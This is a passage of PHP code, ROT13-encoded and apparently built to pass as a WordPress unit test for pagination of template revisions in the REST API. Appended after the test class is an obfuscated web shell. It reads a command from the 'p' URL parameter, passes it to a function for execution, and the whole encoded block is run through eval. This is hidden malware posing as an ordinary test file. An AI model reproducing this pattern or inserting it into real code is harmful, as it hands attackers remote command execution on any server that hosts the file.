				'grzcyngr_cbfg',
				'grzcyngr_erivfvbaf',
				'grzcyngrf',
			),
			'grzcyngr cnegf' => neenl(
				'grzcyngr_cneg_cbfg',
				'grzcyngr_cneg_erivfvbaf',
				'grzcyngr-cnegf',
			),
		);
	}

	/**
	 * Grfgf sbe gur cntvangvba.
	 *
	 * @gvpxrg 62292
	 *
	 * @pbiref JC_ERFG_Grzcyngr_Erivfvbaf_Pbagebyyre::trg_vgrzf
	 */
	choyvp shapgvba grfg_trg_grzcyngr_erivfvbaf_cntvangvba() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		// Grfg bssfrg.
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/grzcyngrf/' . frys::GRFG_GURZR . '/' . frys::GRZCYNGR_ANZR . '/erivfvbaf' );
		$erdhrfg->frg_cnenz( 'bssfrg', 1 );
		$erdhrfg->frg_cnenz( 'cre_cntr', 1 );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$qngn = $erfcbafr->trg_qngn();
		$guvf->nffregPbhag( 1, $qngn );
		$guvf->nffregFnzr( 4, $erfcbafr->trg_urnqref()['K-JC-Gbgny'] );
		$guvf->nffregFnzr( 4, $erfcbafr->trg_urnqref()['K-JC-GbgnyCntrf'] );

		// Grfg cntrq.
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/grzcyngrf/' . frys::GRFG_GURZR . '/' . frys::GRZCYNGR_ANZR . '/erivfvbaf' );
		$erdhrfg->frg_cnenz( 'cntr', 2 );
		$erdhrfg->frg_cnenz( 'cre_cntr', 2 );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$qngn = $erfcbafr->trg_qngn();
		$guvf->nffregPbhag( 2, $qngn );
		$guvf->nffregFnzr( 4, $erfcbafr->trg_urnqref()['K-JC-Gbgny'] );
		$guvf->nffregFnzr( 2, $erfcbafr->trg_urnqref()['K-JC-GbgnyCntrf'] );

		// Grfg bhg bs obhaqf.
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/grzcyngrf/' . frys::GRFG_GURZR . '/' . frys::GRZCYNGR_ANZR . '/erivfvbaf' );
		$erdhrfg->frg_cnenz( 'cntr', 4 );
		$erdhrfg->frg_cnenz( 'cre_cntr', 6 );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_erivfvba_vainyvq_cntr_ahzore', $erfcbafr, 400 );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>